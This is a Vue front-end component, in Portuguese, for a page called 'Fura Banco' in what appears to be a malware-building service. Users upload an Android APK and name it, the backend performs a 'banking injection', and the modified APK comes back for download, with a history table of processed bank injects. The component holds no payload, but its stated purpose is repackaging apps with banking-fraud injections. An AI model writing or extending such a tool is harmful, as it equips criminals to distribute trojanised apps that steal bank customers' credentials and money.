<template>
  <div class="page-container">
    <div class="page-header">
      <div>
        <h1 class="page-title">Fura Banco</h1>
        <p class="page-sub">Suba o .apk e dê um nome — o serviço devolve a versão modificada pra você baixar</p>
      </div>
    </div>

    <div class="card form-card">
      <div class="card-title-group">
        <h3>⬆ Novo Fura Banco</h3>
        <span class="card-sub-info">Suba o APK para injeção bancária</span>
      </div>

      <form @submit.prevent="handleProcess" class="form-body">
        <div class="form-group">
          <label>Nome do App</label>
          <input v-model="appName" type="text" placeholder="Ex: Meu App" required class="text-input" />
        </div>

        <div class="form-group">
          <label>Arquivo .apk</label>
          <div class="dropzone" @click="triggerFileInput" :class="{ 'has-file': selectedFile }">
            <input ref="fileInput" type="file" accept=".apk" class="file-hidden" @change="onFileSelected" />
            <div class="dropzone-content">
              <span class="upload-icon">⬆</span>
              <p v-if="!selectedFile"><strong>Arraste o .apk aqui</strong><br><span class="sub-drop">ou clique pra escolher do computador</span></p>
              <p v-else class="file-selected">✓ {{ selectedFile.name }} ({{ formatSize(selectedFile) }})</p>
            </div>
          </div>
        </div>

        <div class="form-actions">
          <button type="submit" class="btn-process" :disabled="isProcessing || !selectedFile">
            <span>⬆ {{ isProcessing ? 'Processando...' : 'Processar Fura Banco' }}</span>
          </button>
        </div>
      </form>
    </div>

    <!-- Upload Progress -->
    <div v-if="uploadProgress > 0 && uploadProgress < 100" class="card">
      <div class="progress-bar">
        <div class="progress-fill" :style="{ width: uploadProgress + '%' }"></div>
      </div>
      <span class="progress-text">{{ uploadProgress }}% - {{ uploadStatus }}</span>
    </div>

    <!-- History -->
    <div class="card table-card">
      <table class="data-table">
        <thead>
          <tr>
            <th>NOME</th>
            <th>BANCO</th>
            <th>STATUS</th>
            <th>CRIADO EM</th>
            <th>AÇÕES</th>
          </tr>
        </thead>
        <tbody>
          <tr v-if="items.length === 0">
            <td colspan="5" class="empty-cell">
              <div class="android-icon">🤖</div>
              <p>Nenhum Fura Banco processado ainda.</p>
            </td>
          </tr>
          <tr v-for="item in items" :key="item.id">
            <td><strong>{{ item.bank_name }}</strong></td>
            <td>{{ item.inject_type }}</td>
            <td><span class="badge badge-success">Concluído</span></td>
            <td>{{ new Date(item.created_at).toLocaleDateString('pt-BR') }}</td>
            <td><button class="btn-sm btn-primary" @click="downloadApk(item)">⬇ Baixar</button></td>
          </tr>
        </tbody>
      </table>
    </div>
  </div>
</template>

<script setup lang="ts">
import { ref, onMounted } from 'vue';
import axios from 'axios';
import { useAuthStore } from '../stores/auth';

const API_URL = import.meta.env.VITE_API_URL || 'http://localhost/api';
const authStore = useAuthStore();

const appName = ref('');
const selectedFile = ref<File | null>(null);
const fileInput = ref<HTMLInputElement | null>(null);
const isProcessing = ref(false);
const items = ref<any[]>([]);
const uploadProgress = ref(0);
const uploadStatus = ref('');

const triggerFileInput = () => fileInput.value?.click();
const onFileSelected = (e: Event) => {
  const target = e.target as HTMLInputElement;
  if (target.files && target.files[0]) selectedFile.value = target.files[0];
};

const formatSize = (file: File) => {
  if (!file) return '';
  if (file.size < 1024 * 1024) return (file.size / 1024).toFixed(1) + ' KB';
  return (file.size / (1024 * 1024)).toFixed(2) + ' MB';
};

const loadItems = async () => {
  try {
    const res = await axios.get(`${API_URL}/tools/inject-bancos`, {
      headers: { Authorization: `Bearer ${authStore.token}` },
    });
    items.value = res.data.data || res.data.items || res.data || [];
  } catch (e) {
    console.error('Erro ao carregar injects:', e);
  }
};

const handleProcess = async () => {
  if (!selectedFile.value || !appName.value) {
    alert('Nome e arquivo APK são obrigatórios');
    return;
  }

  isProcessing.value = true;
  uploadProgress.value = 0;
  uploadStatus.value = 'Enviando...';

  try {
    const formData = new FormData();
    formData.append('bank_name', appName.value);
    formData.append('name', appName.value);
    formData.append('inject_type', 'default');
    formData.append('apk_file', selectedFile.value);

    await axios.post(`${API_URL}/tools/inject-bancos`, formData, {
      headers: {
        Authorization: `Bearer ${authStore.token}`,
        'Content-Type': 'multipart/form-data',
      },
      onUploadProgress: (progressEvent) => {
        if (progressEvent.total) {
          uploadProgress.value = Math.round((progressEvent.loaded * 100) / progressEvent.total);
          uploadStatus.value = uploadProgress.value < 100 ? 'Enviando...' : 'Processando...';
        }
      },
    });

    uploadProgress.value = 100;
    uploadStatus.value = 'Concluído!';
    appName.value = '';
    selectedFile.value = null;
    await loadItems();
    alert('Fura Banco processado com sucesso!');
  } catch (e: any) {
    alert(e.response?.data?.message || 'Erro ao processar Fura Banco');
  } finally {
    isProcessing.value = false;
    uploadProgress.value = 0;
    uploadStatus.value = '';
  }
};

const downloadApk = async (item: any) => {
  try {
    const res = await axios.get(`${API_URL}/tools/inject-bancos/${item.id}/download`, {
      headers: { Authorization: `Bearer ${authStore.token}` },
      responseType: 'blob',
    });
    const url = window.URL.createObjectURL(new Blob([res.data]));
    const a = document.createElement('a');
    a.href = url;
    a.download = `${item.bank_name}.apk`;
    a.click();
    window.URL.revokeObjectURL(url);
  } catch (e) {
    alert('Erro ao baixar APK');
  }
};

onMounted(() => loadItems());
</script>

<style scoped>
.page-container { display: flex; flex-direction: column; gap: 1.5rem; }
.page-title { font-family: var(--font-display); font-size: 1.5rem; font-weight: 700; color: var(--ink); margin: 0; }
.page-sub { font-size: 0.875rem; color: var(--ink-muted); margin-top: 0.25rem; }

.card { background: var(--surface-1); border: 1px solid var(--hairline); border-radius: var(--r-lg); padding: 1.5rem; }
.card-title-group h3 { font-size: 1.1rem; font-weight: 700; color: var(--ink); margin: 0; }
.card-sub-info { font-size: 0.75rem; color: var(--ink-faint); display: block; margin-top: 0.2rem; }

.form-body { margin-top: 1.5rem; display: flex; flex-direction: column; gap: 1.25rem; }
.form-group { display: flex; flex-direction: column; gap: 0.5rem; }
.form-group label { font-size: 0.85rem; font-weight: 600; color: var(--ink-muted); }
.text-input { padding: 0.75rem; background: var(--surface-2); border: 1px solid var(--hairline); border-radius: var(--r-sm); color: var(--ink); outline: none; }

.dropzone { border: 2px dashed var(--hairline); border-radius: var(--r-md); padding: 2.5rem; text-align: center; cursor: pointer; background: var(--surface-2); transition: border-color 0.2s; }
.dropzone:hover { border-color: var(--accent); }
.file-hidden { display: none; }
.upload-icon { font-size: 1.5rem; color: var(--ink-faint); display: block; margin-bottom: 0.5rem; }
.sub-drop { font-size: 0.75rem; color: var(--ink-faint); }
.file-selected { color: var(--success); font-weight: 600; }

.form-actions { display: flex; justify-content: flex-end; margin-top: 0.5rem; }
.btn-process { padding: 0.75rem 1.5rem; background: var(--surface-3); color: var(--ink-muted); border: 1px solid var(--hairline); border-radius: var(--r-sm); font-weight: 600; cursor: pointer; }
.btn-process:disabled { opacity: 0.5; cursor: not-allowed; }

.progress-bar { height: 8px; background: var(--surface-3); border-radius: 4px; overflow: hidden; margin: 1rem 0; }
.progress-fill { height: 100%; background: var(--accent); transition: width 0.3s ease; }
.progress-text { font-size: 0.8rem; color: var(--ink-muted); }

.data-table { width: 100%; border-collapse: collapse; text-align: left; font-size: 0.875rem; margin-top: 0.5rem; }
.data-table th { padding: 0.75rem 1.25rem; background: var(--surface-2); color: var(--ink-faint); font-weight: 700; font-size: 0.7rem; border-bottom: 1px solid var(--hairline); }
.data-table td { padding: 1rem 1.25rem; border-bottom: 1px solid var(--hairline); color: var(--ink); }
.empty-cell { padding: 4rem; text-align: center; color: var(--ink-muted); }
.android-icon { font-size: 2.5rem; margin-bottom: 0.5rem; opacity: 0.4; }
.badge-success { background: var(--success-soft); color: var(--success); padding: 0.2rem 0.5rem; border-radius: 100px; font-size: 0.75rem; font-weight: 600; }
.btn-sm { padding: 0.35rem 0.75rem; font-size: 0.8rem; background: var(--accent); color: white; border: none; border-radius: var(--r-sm); cursor: pointer; }
</style>